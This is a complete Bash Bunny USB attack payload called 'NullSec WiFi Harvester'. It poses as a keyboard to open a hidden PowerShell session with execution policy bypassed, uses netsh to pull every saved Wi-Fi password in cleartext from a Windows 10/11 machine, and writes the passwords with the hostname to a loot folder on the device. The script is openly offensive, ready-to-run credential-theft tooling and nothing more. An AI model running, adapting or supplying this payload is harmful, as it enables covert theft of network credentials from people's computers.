#!/bin/bash
#
# Title:         NullSec WiFi Harvester
# Description:   Extracts all saved WiFi passwords from Windows and saves to loot
# Author:        bad-antics
# Version:       1.0
# Category:      Credentials
# Target:        Windows 10/11
# Attackmodes:   HID, STORAGE

# Options
LOOTDIR=/root/udisk/loot/NullSec-WiFi-Harvester

######## INITIALIZATION ########
LED SETUP
GET SWITCH_POSITION
ATTACKMODE HID STORAGE

######## MAKE LOOT DIRECTORY ########
mkdir -p $LOOTDIR

######## ATTACK ########
LED ATTACK

# Open hidden PowerShell and run WiFi extraction
RUN WIN "powershell -w hidden -ep bypass"
QUACK DELAY 1500

# Create extraction script
QUACK STRING "\$loot = (gwmi win32_volume -f 'label=''BashBunny''').Name + 'loot\\NullSec-WiFi-Harvester\\';"
QUACK ENTER
QUACK DELAY 200

QUACK STRING "\$hostname = \$env:COMPUTERNAME;"
QUACK ENTER
QUACK DELAY 200

QUACK STRING "\$profiles = (netsh wlan show profiles) | Select-String '\\:(.+)\$' | ForEach-Object { \$_.Matches.Groups[1].Value.Trim() };"
QUACK ENTER
QUACK DELAY 500

QUACK STRING "\$output = foreach (\$p in \$profiles) { \$pass = (netsh wlan show profile name=\"\$p\" key=clear | Select-String 'Key Content.*:(.*)').Matches.Groups[1].Value; if(\$pass){\"[\$hostname] \$p : \$pass\"} };"
QUACK ENTER
QUACK DELAY 2000

QUACK STRING "\$output | Out-File -Encoding utf8 (\$loot + \$hostname + '_wifi.txt');"
QUACK ENTER
QUACK DELAY 500

QUACK STRING "exit"
QUACK ENTER

# Wait for file write
sleep 5

######## FINISH ########
LED FINISH
